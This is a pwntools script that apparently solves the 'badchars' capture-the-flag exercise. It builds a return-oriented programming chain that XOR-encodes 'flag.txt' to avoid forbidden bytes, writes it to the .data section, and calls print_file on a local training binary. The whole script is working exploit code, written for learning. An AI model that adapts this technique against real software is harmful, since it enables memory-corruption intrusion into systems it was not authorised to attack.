from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./badchars', checksec=False)
p = process()
info(p.recvline_contains('badchars are'))

# How many bytes to EIP?
offset = 40

# ROP
rop = ROP(elf)  # Load rop so we can access gadgets

# Address of .data section (size=10 bytes)
data_section_address = elf.symbols.data_start + 8  # ???
info("%#x data_section_address", data_section_address)
# We will pop the string (flag.txt) into r12
# Then pop address of .data section into r13
pop_r12_r13_r14_r15 = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"])[0]
info("%#x pop r12; pop r13; pop r14; pop r15; ret;", pop_r12_r13_r14_r15)
# We will then move the string from r12 (flag.txt) into memory location stored in r13
mov_r13_r12 = elf.symbols.usefulGadgets + 12  # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all
info("%#x mov qword ptr [r13], r12; ret;", mov_r13_r12)

# Pop XOR value (1 byte) into r14 and .data memory address into r15
pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]  # pop r14; pop r15; ret;
info("%#x pop r14; pop r15; ret;", pop_r14_r15)
# XOR value pointed to by r15 with r14
xor_r15_r14 = elf.symbols.usefulGadgets  # xor byte ptr [r15], r14b; ret;
info("%#x xor byte ptr [r15], r14b; ret;", xor_r15_r14)

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

xor_xploit = b""
data_addr_offset = 0
# The output of this will be used to XOR back to 'flag.txt' after it's been written to .data
for c in xored_string:
    xor_xploit += pack(pop_r14_r15)  # Pop the next params into r14 and r15
    xor_xploit += pack(value_to_xor_with)  # Value to XOR with ('2' in our case)
    xor_xploit += pack(data_section_address + data_addr_offset)  # Address of .data section with offset to current char
    xor_xploit += pack(xor_r15_r14)  # XOR the value in memory address pointed to by r15 with the value in r14
    data_addr_offset += 1  # Add an extra byte to offset each loop until we've covered all chars

# Write the XORed flag and then XOR back to original value
rop.raw([pop_r12_r13_r14_r15, xored_string, data_section_address, 0x0, 0x0, mov_r13_r12, xor_xploit])

# Call print file function with data section address as param
rop.print_file(data_section_address)

# Chain it together (get the raw ROP bytes)
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Build payload (inject rop_chain at offset)
payload = flat({
    offset: rop_chain
})

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
